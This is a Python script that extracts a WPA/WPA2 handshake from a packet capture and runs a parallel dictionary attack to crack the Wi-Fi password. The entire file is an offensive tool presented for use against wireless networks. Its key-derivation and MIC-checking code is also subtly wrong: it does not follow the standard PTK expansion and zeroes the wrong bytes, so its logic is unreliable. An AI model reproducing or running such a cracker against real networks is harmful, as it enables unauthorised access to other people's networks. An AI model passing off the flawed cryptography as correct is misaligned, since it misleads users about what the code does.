import hashlib
import hmac
import struct
import os
from scapy.all import *
from Crypto.Protocol.KDF import PBKDF2
from multiprocessing import Pool

# Constants
EAPOL_TYPE = 0x888e
MIC_LENGTH = 16
PMK_LENGTH = 32
ANONCE_LENGTH = 32
SNONCE_LENGTH = 32
MAC_ADDR_LENGTH = 6

def derive_pmk(ssid, password):
    """Derive PMK using PBKDF2."""
    return PBKDF2(password, ssid.encode('utf-8'), dkLen=PMK_LENGTH, count=4096, prf=None)

def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    """Derive PTK using PMK, ANonce, SNonce, and MAC addresses."""
    data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]

def validate_mic(ptk, mic, eapol_frame):
    """Validate the MIC using HMAC-SHA1."""
    eapol_mic = eapol_frame[:-MIC_LENGTH] + b'\x00' * MIC_LENGTH
    calculated_mic = hmac.new(ptk, eapol_mic, hashlib.sha1).digest()[:MIC_LENGTH]
    return calculated_mic == mic

def extract_handshake(pcap_file):
    """Extract handshake parameters from the PCAP file."""
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Error reading PCAP file: {e}")
        return None

    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None
    eapol_frames = [p for p in packets if p.haslayer(EAPOL)]

    if len(eapol_frames) < 2:
        print("[-] Not enough EAPOL frames for a handshake.")
        return None

    for frame in eapol_frames:
        if ap_mac is None:
            ap_mac = frame[Ether].src
            client_mac = frame[Ether].dst
            anonce = frame[EAPOL].load[13:45]
        elif snonce is None:
            snonce = frame[EAPOL].load[13:45]
            mic = frame[EAPOL].load[-MIC_LENGTH:]
            eapol_frame = bytes(frame)
            break

    if not all([ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
        print("[-] Incomplete handshake.")
        return None

    return ap_mac, client_mac, anonce, snonce, mic, eapol_frame

def try_password(args):
    """Try a single password."""
    password, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = args
    pmk = derive_pmk(ssid, password)
    ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
    if validate_mic(ptk, mic, eapol_frame):
        return password
    return None

def crack_password(pcap_file, wordlist, ssid, output_file="found_password.txt"):
    """Perform a dictionary attack to crack WPA/WPA2 passwords."""
    handshake = extract_handshake(pcap_file)
    if handshake is None:
        return

    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = handshake
    print("[*] Handshake successfully extracted.")
    print(f"    AP MAC: {ap_mac}, Client MAC: {client_mac}")

    with open(wordlist, "r") as file:
        passwords = [line.strip() for line in file]

    args = [(password, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame) for password in passwords]

    print("[*] Starting dictionary attack...")
    with Pool() as pool:
        for result in pool.imap_unordered(try_password, args):
            if result:
                print(f"[+] Password found: {result}")
                with open(output_file, "w") as f:
                    f.write(result + "\n")
                return

    print("[-] Password not found in the provided wordlist.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Usage: python3 crack_wifi.py <pcap file> <wordlist> <SSID>")
        sys.exit(1)

    pcap_file = sys.argv[1]
    wordlist = sys.argv[2]
    ssid = sys.argv[3]

    if not os.path.exists(pcap_file):
        print(f"[-] PCAP file '{pcap_file}' does not exist.")
        sys.exit(1)

    if not os.path.exists(wordlist):
        print(f"[-] Wordlist file '{wordlist}' does not exist.")
        sys.exit(1)

    crack_password(pcap_file, wordlist, ssid)



